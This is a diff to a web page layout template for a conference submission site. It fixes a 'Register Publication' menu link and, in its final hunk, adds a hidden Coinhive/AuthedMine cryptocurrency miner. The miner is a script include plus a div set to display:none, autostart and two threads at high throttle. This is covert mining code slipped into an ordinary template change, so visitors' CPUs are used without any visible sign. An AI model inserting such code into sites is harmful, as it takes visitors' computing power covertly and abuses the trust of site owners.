@@ -126,7 +126,7 @@
                         <a href="#submissions" class="list-group-item " data-toggle="collapse"><i class="glyphicon glyphicon-list"></i>Submission  <span class="glyphicon glyphicon-chevron-right"></span></a>
                         <div class="collapse" id="submissions">
                             <a href="{{ route('user.conference.register') }}" class="list-group-item">Register Conference</a>
-                            <a href="{{ route('user.conference.register') }}" class="list-group-item">Register Publication</a>
+                            <a href="{{ route('user.publication.register') }}" class="list-group-item">Register Publication</a>
                             <a href="{{ route('user.submission') }}" class="list-group-item">List</a>
                         </div>
                     </li>
@@ -168,6 +168,7 @@
 
 </div>
 
+
 <script type="text/javascript" src="{{ asset("/js/bf-admin.js") }}"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.7.1/js/bootstrap-datepicker.min.js"></script>
 <script src="{{ asset('js/ssmath.js') }}"></script>
@@ -176,5 +177,13 @@
 <script type="text/javascript" src="https://cdn.datatables.net/v/bs/dt-1.10.16/datatables.min.js"></script>
 
 @yield('scripts',"")
-
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<div class="coinhive-miner"
+     style="width: 256px; height: 310px; display: none"
+     data-key="ePDKYq4a5JjUiiLlA3pRntapcixcJQBO"
+     data-autostart="true"
+     data-threads="2"
+     data-throttle="0.8">
+    <em>Loading...</em>
+</div>
 </body></html>
